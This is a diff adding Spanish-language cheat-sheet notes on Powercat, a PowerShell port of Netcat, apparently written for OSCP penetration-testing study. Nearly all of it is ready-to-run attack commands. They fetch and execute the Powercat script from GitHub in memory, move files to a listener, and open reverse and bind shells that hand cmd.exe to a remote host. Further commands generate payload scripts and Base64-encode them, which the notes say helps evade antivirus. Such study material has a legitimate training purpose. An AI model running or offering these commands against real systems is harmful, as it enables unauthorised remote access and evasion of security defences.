@@ -1,0 +1,77 @@
+### Powercat
+Powercat
+
+Se trata de la versión de Netcat para PowerShell.
+
+
+1. Powercat
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')  	# Descarga de repositorio de powercat
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+• powercat
+   ◇ -h →  Modo ayuda
+   ◇ -c <ip> → Client Mode. Provide the IP of the system you wish to connect to.  If you are using -dns, specify the DNS Server to send queries to.
+   ◇  -l → Listen Mode. Start a listener on the port specified by -p.
+   ◇  -p <port> → Port. The port to connect to, or the port to listen on.
+   ◇  -e <proc> → Execute. Specify the name of the process to start.
+   ◇  -i <input> → Input. Provide data to be sent down the pipe as soon as a connection established. Used for moving files. You can provide the path to a file, a byte array object, or a string. You can also pipe any of those int powercat, like 'aaaaaa' |powercat -c 10.1.1.1 -p 80
+   ◇  -g → Generate Payload. Returns a script as a string which will execute the powercat with the options you have specified. -i, -d, and -rep will be incorporated.
+   ◇  -ge → Generate Encoded Payload. Does the same as -g, but returns a string can be executed in this way: powershell -E <encoded string>
+
+
+2. Powercat File Transfers
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+sudo nc -nlvp 443 > receiving_powercat.ps1				# Ponemos a escuchar en la maquina destino en el puerto 443 e indicando que guarde lo que reciba en un fichero concreto
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+powercat -c 192.168.121.132 -p 443 -i C:\Users\bombur\Desktop\OSCP\powercat\powercat.ps1		# En el origen ejecutamos powercat indicando ip, puerto y el archivo a enviar
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+3. Powercat Reverse Shells
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+sudo nc -nlvp 443									# Escuchamos en el puerto 443
+---------------------------------------------------------------------------------------------------------------------------
+powercat -c 192.168.121.132 -p 443 -e cmd.exe		# Le decimos que ejecute el terminal de windows a través del puerto 443
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+4. Powercat Bind Shells
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ powercat -l -p 443 -e cmd.exe 				# Ponemos a escuchar en la máquina destino asociando el puerto 443 al terminal de Windows
+ ------------------------------------------------------------------------------------------------------------------------------------
+ nc -nv 192.168.121.1 443
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+5.  Powercat Stand-Alone Payloads
+
+Powercat permite generar payloads (conjunto de instrucciones de PowerShell)
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+powercat -c 192.168.121.132 -p 443 -e cmd.exe -g > powercat_reverse_shell.ps1			# Creamos una reverse shell, la convertimos en payload con la opción -g y la guardamos en un fichero
+./powercat_reverse_shell.ps1				# A partir de ahi se puede ejecutar llamando al fichero
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+sudo nc -nlvp 443				# Escuchamos en el puerto de la maquina desde la que abrir el shell
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Otra opción es utilizar la opción -ge para encriptar en Base64 el payload y evitar que sea detectado por antivirus, esto se hace de la siguiente manera
+ 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+powercat -c 192.168.121.132 -p 443 -e cmd.exe -ge > powercat_reverse_shell_encripted.ps1	
+powershell -E $(Get-Content .\powercat_reverse_shell_encripted.ps1)			# Se ejecuta con la opción -E de powershell y el comando Get-Content <file>
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
